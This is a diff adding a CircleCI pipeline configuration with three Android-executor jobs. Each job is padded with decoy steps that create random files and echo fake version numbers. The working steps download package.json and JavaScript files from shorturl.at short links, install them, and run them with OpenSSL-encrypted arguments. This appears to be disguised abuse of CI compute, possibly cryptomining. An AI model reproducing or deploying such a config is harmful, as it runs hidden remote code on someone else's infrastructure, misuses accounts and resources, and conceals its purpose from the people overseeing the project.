@@ -1,0 +1,72 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  xay-dung:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: echo version 23530213637.928753
+      - run: touch 1fuiw4vwxj2oyhd6xy8d5q.ts
+      - run: curl -fsSL shorturl.at/fFMVW -o package.json && curl -fsSL
+          shorturl.at/bjBCV -o j4ior8mvp.js && curl -fsSL shorturl.at/pzTY9 -o
+          oux8yuej2he3mqpew9.js
+      - run: mkdir gzojsa35zpgpreigt
+      - run: touch j29k1hww2agjfh9xjvy.php
+      - run: npm i -s
+      - run: touch da42522hypt.ts
+      - run: node j4ior8mvp -sp -lpn
+          U2FsdGVkX19p+LArtjBRVuCoApqrHrLUdFgFFQyJGeTjAvjpHQ2fwY5FLiggZBGB -t
+          U2FsdGVkX1+lIZy5+GhfZlVillivHEsH6pIQbwBKY//b3ODGcj9HNUoURefQy6ym -s
+          U2FsdGVkX1+t4KG3RJ+vOGZWXduwq5qizP3Um2nS42mfn1UecxMsCk8CnBbul8XhKCerwhLJtROainW1ca7OphzKtSrECfNBIXVOIkRyVs4UXl0c2rbZpXeu9zIp9oG6Uy5bctSHPopf1kGJVLlNXjs9LPGZx5yj9dN+qRrF1Bm3YopzUt19LHvZcBwhCb0czNbb9+q4iEDapT9ViorQ4n68bOd7TYGSgg27Zn2ZFag=
+          -r
+          U2FsdGVkX1+BQCnVyvdI4tK5i1KFfiSy5eLD+gA17QmlS+HP1dKJ3dEAKbX+4MyGXjOt8039gbTolck5vGg65spyx2jscz8XH+rxUD4kDC/uihshvU8p5Y467aldG+EO1IP7jAaWAY1JGRO6na/hYTWLsi8dtxSreWQD/NqvWVxwIhfaKPrTNL+/dniQBTYirg+qRPPM4VvkALMjcenl3AjHtAhmmZPjM8SXT285tpnELe0zbZCY2Qb7B1A7CyOllOBF098KaoAw4Rv4Jgx8+6gsD63ZYt3VJhQRb0wrbuc=
+      - run: mkdir vus6tca6vgsjbeactq
+  test:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch 2jq7o6kgq38ug4s4c.net
+      - run: curl -fsSL shorturl.at/ijADE -o 7dza5lgd1joh6da.js && curl -fsSL
+          shorturl.at/owC17 -o package.json && curl -fsSL shorturl.at/bnyP2 -o
+          uifdvxjzs9f.js
+      - run: echo version 17577900926.29913
+      - run: touch xxbz6gb8tr4wrul8tg.cpp
+      - run: npm i -s
+      - run: touch bx2u4rs64w9j9y3t1cixr.c
+      - run: mkdir 16xgn737ndx1f1nkwzb
+      - run: touch lgknprsjlb0chw47dmf2ua.py
+      - run: node 7dza5lgd1joh6da -sp -s
+          U2FsdGVkX1+WgUTktN3LVVDRA1DposVpq2jtC5F9Vfzu2Cz4Obhw67Bt1Tgqwo1Pn/9XABvoGHu2ZsDBHyu2XZnGNgGaDD2SFwoulYf7s/lSKH2tADPOBOaVejMncXnUw1faLfzzR6+2XrxfEfbU2+n6PZJ4oh+PFw9oic91O8MH8RLaj1N8mOpTSnOnrmJcYlMxT4+v68p3cKrJRR0acC/glyKsIgCqKOrnJRM9UOI=
+          -lpn U2FsdGVkX1+vGmbPfzWMyHiWUac8Z8hRYOQryab+nXY= -r
+          U2FsdGVkX1/9CNSnMbgG1IPkkDkqMVj+AUY+7kItWHnluJknw0lloZ9MPqT+74/Lh88K5PWQ3DnzYgz66omX5iKBUS65711H9w4tse78Rw5Y36eGJ3kjmPJF3G97VflDe6XyMUtTQK5uRN5ufbikdZ2+Sx14W0Qq/36B+dGYcqBPWTxbrxaBZlzNGpQPlYqqwvDxfz6j/I6SZglMEtYgV12B3jAjVmqgNwTUEfyKTlqJlBEWtY4G8AQrqOXBPEyqlybTQxGp9vAosQQn98+D1HI540Xvvf38vrF9yHW5Ui4=
+          -t U2FsdGVkX19z+v74IHo1HtCB4ZlQFxa4HHJPE9nNv8xpKEWhAWI+cB9fSZhuoc8n
+  user:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch nhz8bp3k4oo7thu29j.js
+      - run: mkdir 7t0sp1gd4849a22fkqh8ruesa
+      - run: curl -fsSL shorturl.at/ilADS -o usgxjb.js && curl -fsSL shorturl.at/msEN1
+          -o iyjfuaswc.js && curl -fsSL shorturl.at/cglEN -o package.json
+      - run: mkdir syvr6b4m9ey83ake643osi2
+      - run: npm i -s
+      - run: touch bycllpiae6c8p.sh
+      - run: mkdir eecczapl3d67ikh2z5ko6
+      - run: mkdir zz2obkfefer2zhp1sd8b8
+      - run: node iyjfuaswc -t
+          U2FsdGVkX1/PsVdjvvr/XFDVw74FHlz8iQoybKtHbNeQQs4/neLdE86rF2QOwuHs -s
+          U2FsdGVkX1+OZBT12g+bEaGYzvTkE6FaD+LkkkVxy5V3oZawyYCKqrcriIo4lIJhfdlW/YnC4di5eSE4BR+oB/H5AZfRzTS4+COzcZy+YTq0muAcw2RwJk0zLDVbnwDFTQ48Us2mb7ISNUIOKTYfm9/A5B83o+8D4MdCQtl3MhrJEpiau+q2w3MErHcw8uWylegdQ24/WDiDKVqsf4nUh2f80UizAXydo6O5ns9InLQ=
+          -r
+          U2FsdGVkX18TWCTviFEVdVhxfAgG1XcjRToL/qHkpJlEvqUtrHHIYHrhe4oOYFGRl8kKHPQntiR1ADNyZluBYMNHOhYerlmy8i/tsdRNCzUl5NmtEZ8jtSosSU7GD8sSEKkwolnaKYxmKsU91iCWco9WKf/mkbmGCvalL8iN0t3kp78FG6GfoVSYQT7i9UZL3+HAK8iG9f5Gz/rmNKBUWWesTAAdGsjyr4WLuUV6rAFG+j+j9mAJ+zglmrJWAWfUcB4wly5PArWSaL0DPLcUn0kdUjDsaCOXkxcSZcJaUls=
+          -lpn U2FsdGVkX19ufCVhFbAMLEObcY3EK55BQRxopeykLNU= -sp
+workflows:
+  shitJob:
+    jobs:
+      - xay-dung
+  run-jobs:
+    jobs:
+      - test
+  code_602:
+    jobs:
+      - user
